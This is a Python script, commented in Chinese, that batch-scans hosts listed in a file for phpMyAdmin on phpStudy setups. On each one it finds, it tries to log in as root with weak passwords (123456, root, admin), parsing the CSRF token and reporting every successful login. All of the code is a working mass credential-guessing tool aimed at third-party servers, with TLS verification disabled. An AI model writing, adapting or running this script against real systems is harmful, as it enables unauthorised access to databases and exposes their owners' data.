#!/usr/bin/env python3
"""批量测phpStudy目标的phpMyAdmin弱口令"""
import urllib.request, http.cookiejar, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def check_pma(host):
    for path in ["/phpmyadmin/", "/phpMyAdmin/", "/pma/"]:
        try:
            req = urllib.request.Request(f"http://{host}{path}", headers={"User-Agent":"Mozilla/5.0"})
            r = urllib.request.urlopen(req, timeout=8, context=ctx)
            html = r.read().decode("utf-8","ignore")
            if "phpMyAdmin" in html or "pma_username" in html:
                return path
        except Exception:
            continue
    return None

def try_pma_login(host, path):
    """测试常见弱口令"""
    for pw in ["123456", "root", "admin"]:
        try:
            cj = http.cookiejar.CookieJar()
            op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
            op.addheaders = [("User-Agent","Mozilla/5.0")]
            base = f"http://{host}{path}"
            r = op.open(base, timeout=8)
            html = r.read().decode("utf-8","ignore")
            m = re.search(r'name="token" value="([a-f0-9]{32})"', html)
            if not m: continue
            data = f"pma_username=root&pma_password={pw}&server=1&token={m.group(1)}".encode()
            op.open(urllib.request.Request(f"{base}index.php", data=data), timeout=8).read()
            r = op.open(f"{base}index.php", timeout=8)
            body = r.read().decode("utf-8","ignore")
            if "Cannot log in" in body or "#1045" in body:
                continue
            if "logout" in body or "navigation" in body or "server_databases" in body:
                return f"root/{pw}"
        except Exception:
            continue
    return None

targets = []
for line in open("/tmp/phpstudy_targets.txt"):
    line = line.strip()
    if line: targets.append(line)

for host in targets:
    path = check_pma(host)
    if not path:
        print(f"{host}: 无phpMyAdmin", flush=True)
        continue
    result = try_pma_login(host, path)
    if result:
        print(f"!!! {host}: phpMyAdmin登录成功 {result} (路径{path})", flush=True)
    else:
        print(f"{host}: phpMyAdmin存在但弱口令失败", flush=True)
